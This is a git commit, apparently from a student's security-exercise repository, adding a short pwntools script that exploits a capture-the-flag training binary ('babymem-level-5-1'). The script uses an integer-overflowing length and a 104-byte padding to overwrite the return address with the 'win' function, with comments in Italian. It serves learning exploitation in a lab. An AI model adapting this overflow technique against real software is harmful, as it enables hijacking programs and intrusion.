874f1bad79e55f3d0a7fbe7e730b52cd7f8e0fd8
MaxL22 <max987651@gmail.com>
2025-03-15 01:31:59 +0100

    some BO

---
+++ scripts/bufferOverflow/5.1.py
@@ -0,0 +1,16 @@
+from pwn import *
+
+elf = ELF("/challenge/babymem-level-5-1")
+p = elf.process()
+
+# Dimensione della linea
+p.sendline(b"2")
+p.sendline(b"2147483648")
+
+# p64 fa il packing da intero a indirizzo, little endian
+payload = b"A"*(104) + p64(elf.symbols["win"])
+
+# Mandare il payload
+p.sendline(payload)
+
+p.interactive()
